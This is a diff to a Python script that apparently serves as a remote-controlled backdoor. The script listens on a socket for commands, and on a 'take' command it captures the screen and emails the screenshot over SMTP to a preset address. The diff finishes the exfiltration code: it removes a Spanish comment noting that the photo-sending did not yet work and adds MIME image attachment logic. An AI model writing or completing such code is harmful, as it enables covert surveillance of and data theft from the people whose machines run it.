@@ -2,9 +2,11 @@
 from pyautogui import screenshot
 from socket import *
 from smtplib import SMTP
-from email.mime.base import MIMEBase
-from email.encoders import encode_base64
-from os import path
+from email.mime.multipart import MIMEMultipart
+from email.mime.image import MIMEImage
+from email.mime.text import MIMEText
+from datetime import datetime
+
 
 if __name__ == '__main__':
 	sock = socket(AF_INET, SOCK_STREAM)
@@ -27,18 +29,20 @@ if __name__ == '__main__':
 			server = cmd[7:]
 		elif cmd[:4] == "take":
 			try:
-				#Aun no sirve lo de mandar la foto, sigue en progreso.
 				ss = screenshot()
 				ss.save(cmd[5:])
+				msg = MIMEMultipart()
+				msg['From']=user
+				msg['To']=urmail
+				msg['Subject']="SSBD"
+				msg.attach(MIMEText("Screenshot tomada el {}".format(datetime.now())))
+				file = open(cmd[5:], "rb")
+				attach_image = MIMEImage(file.read())
+				attach_image.add_header('Content-Disposition', 'attachment; filename = "SCREENSHOT"')
+				msg.attach(attach_image)
 				server = SMTP(server)
 				server.starttls()
 				server.login(user, password)
-				ad = MIMEBase('application', 'octet-stream')
-				ad.set_payload(open(cmd[5:], "rb").read())
-				ad = encode_base64(ad)
-				server.sendmail(user, urmail, str(ad))		
+				server.sendmail(user, urmail, msg.as_string())		
 			except Exception as e:
 				conn.send("{}".format(e).encode())
-
-
-
